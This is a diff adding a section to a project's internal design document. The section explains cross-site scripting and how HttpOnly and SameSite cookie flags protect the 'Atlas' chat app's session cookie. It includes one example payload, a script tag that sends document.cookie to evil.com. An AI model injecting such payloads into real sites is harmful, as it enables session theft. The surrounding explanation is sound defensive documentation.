@@ -1033,6 +1033,29 @@ The most common trigger is the 30-minute session TTL expiring while the user was
 
 On the frontend, `checkAuthRedirect` detects the 401, immediately sets `window.location.href = '/login'` — the page navigates away — and throws `'Not authenticated'`. The thrown error is caught by the inner try-catch in `chatStore` and falls back to `currentStatus: 'Processing'`, but the navigation has already happened so this is moot.
 
+### What is XSS and why does HttpOnly protect against it?
+
+**XSS (Cross-Site Scripting)** is an attack where malicious JavaScript is injected into a page and runs in the victim's browser, in the context of your origin — meaning it has the same privileges as your own code.
+
+**How the attack works without HttpOnly:**
+
+1. An attacker finds an input that gets rendered unsanitized into the page (e.g. a chat message displayed as raw HTML).
+2. They submit `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`.
+3. When another user views the page, the script runs, reads `document.cookie` (which includes `atlas_session`), and sends it to the attacker's server.
+4. The attacker uses the stolen cookie to make authenticated requests to Atlas — they are now logged in as the victim.
+
+**Why HttpOnly stops this:**
+
+The browser enforces a hard rule: cookies marked `HttpOnly` are never exposed to JavaScript at all. `document.cookie` simply omits them. The injected `<script>` runs fine but gets back an empty string — there is nothing to steal. The cookie still travels in HTTP request headers (that's its entire purpose), but JS code — including attacker-injected code — can never read it.
+
+**What HttpOnly does not protect against:**
+
+HttpOnly only blocks *reading* the cookie from JS. It does not stop an attacker from making requests that *carry* the cookie (the browser still attaches it). That class of attack — making authenticated requests on behalf of the user — is CSRF, which is what `SameSite=Lax` addresses.
+
+**Atlas's exposure:**
+
+Atlas renders chat responses from an LLM. If the LLM ever produced a response containing a `<script>` tag and the frontend rendered it as raw HTML, that would be an XSS vector. React's JSX escapes HTML by default (`dangerouslySetInnerHTML` is not used for chat messages), so injected tags are rendered as literal text — but `HttpOnly` is a second line of defence regardless.
+
 ---
 
 ## Sequence Diagram
